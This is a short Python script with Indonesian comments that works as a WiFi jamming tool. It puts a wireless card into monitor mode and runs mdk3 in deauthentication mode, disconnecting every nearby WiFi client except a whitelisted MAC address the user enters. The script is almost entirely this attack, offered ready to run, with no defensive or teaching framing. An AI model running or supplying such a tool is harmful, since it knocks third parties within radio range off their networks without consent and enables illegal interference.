'''
 * Copyright (C)2019 - Achmad Chun-Chun Winata Adi <anonychun@gmail.com>
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
'''

import os

# memilih interface
os.system('iwconfig')
print("1. wlan0")
print("2. wlp2s0")
wlan = int(input("\nPilih interface WiFi [1/2]? : "))
os.system("clear")

if wlan == 1:
	# menampilkan mac addres
	print("↓↓ MAC Address ↓↓")
	os.system("cat /sys/class/net/wlan0/address")
	print("=================\n")

	# input mac address
	mac = input("Masukan MAC Address = ")
	os.system("clear")

	# proses pembuatan whitelist
	file = open('whitelist.txt', 'w')
	file.write(mac)
	file.close()
	os.system('clear')

	print("Sedang Melakukan Proses Disconnect WiFi / SSID . . .\n\n")

	# proses membuat adapter type monitor
	os.system('sudo iw wlan0 interface add mon0 type monitor')
	# proses disconnect WiFi
	os.system('sudo mdk3 mon0 d -w whitelist.txt')
	os.system('clear')

elif wlan == 2:
	# menampilkan mac addres
	print("↓↓ MAC Address ↓↓")
	os.system("cat /sys/class/net/wlp2s0/address")
	print("=================\n")

	# input mac address
	mac = input("Masukan MAC Address = ")
	os.system("clear")

	# proses pembuatan whitelist
	file = open('whitelist.txt', 'w')
	file.write(mac)
	file.close()
	os.system('clear')

	print("Sedang Melakukan Proses Disconnect WiFi / SSID . . .\n")

	# proses membuat adapter type monitor
	os.system('sudo iw wlp2s0 interface add mon0 type monitor')
	# proses disconnect WiFi
	os.system('sudo mdk3 mon0 d -w whitelist.txt')
	os.system('clear')

else:
	print("Input yang anda masukan salah")